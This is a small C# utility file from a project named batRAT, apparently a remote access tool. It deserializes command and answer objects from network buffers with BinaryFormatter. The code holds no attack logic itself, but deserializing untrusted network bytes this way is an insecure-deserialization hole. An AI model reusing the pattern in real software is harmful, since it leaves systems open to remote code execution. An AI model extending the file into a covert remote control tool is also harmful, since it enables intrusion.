using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

using batRAT.Commands;

namespace batRAT {
    public class Utilities {
        public static Command ExtractCommand(StateObject state, int bytesReceived) {
            byte[] buf = new byte[bytesReceived];
            Array.Copy(state.buffer, 0, buf, 0, bytesReceived);
            using(var ms = new MemoryStream(buf)) {
                Command o = (Command)new BinaryFormatter().Deserialize(ms);
                ms.Close();
                return o;
            }
        }

        public static CommandAnswer ExtractAnswer(StateObject state, int bytesReceived) {
            byte[] buf = new byte[bytesReceived];
            Array.Copy(state.buffer, 0, buf, 0, bytesReceived);
            using(var ms = new MemoryStream(buf)) {
                CommandAnswer o = (CommandAnswer)new BinaryFormatter().Deserialize(ms);
                ms.Close();
                return o;
            }
        }
    }
}
